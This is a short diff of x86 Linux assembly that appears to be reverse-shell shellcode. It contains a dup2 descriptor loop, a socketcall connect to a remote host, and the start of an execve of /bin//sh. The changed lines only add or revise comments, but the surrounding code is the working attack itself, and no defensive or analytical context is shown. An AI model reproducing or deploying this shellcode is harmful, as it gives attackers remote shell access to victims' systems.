@@ -110,7 +110,7 @@ x86_dup2:
     jns     x86_dup2    ; jump if not signed
     
     ; step 3, connect to remote host
-    ; connect (s, &sa, sizeof(sa));
+    ; socketcall (SYS_CONNECT, {s, &sa, sizeof(sa)});
     push    16          ; sizeof(sa) 
     push    ebp         ; &sa
     push    ebx         ; s
@@ -121,6 +121,7 @@ x86_dup2:
     mov     al, 102     ; eax = sys_socketcall    
     int     0x80
     
+    ; execve("/bin//sh", NULL, NULL);
 x84_execve:
     cdq
     xor     esi, esi
